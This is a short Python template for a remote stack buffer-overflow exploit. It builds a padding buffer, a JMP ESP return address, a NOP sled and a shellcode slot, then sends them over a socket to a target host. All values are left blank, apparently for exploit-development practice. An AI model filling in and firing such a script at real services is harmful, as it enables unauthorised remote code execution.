import socket
import sys

# Exploit Configuration
OFFSET = 0
RETN = ""              # JMP ESP and "BBBB" payload
NOP_SLED = ""
PAYLOAD = ""           # EIP Finder and Shellcode
TARGET_IP = ""
TARGET_PORT = 80

# Buffer Construction
overflow = "A" * OFFSET
exploit = overflow + RETN + NOP_SLED + PAYLOAD

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.recv(1024)
    s.recv(1024)

    s.send(bytes(exploit + "\r\n", "latin-1"))
    print("Payload sent successfully!")

    s.recv(1024)

except (socket.error, socket.timeout):
    print("Unable to connect")
    sys.exit(0)
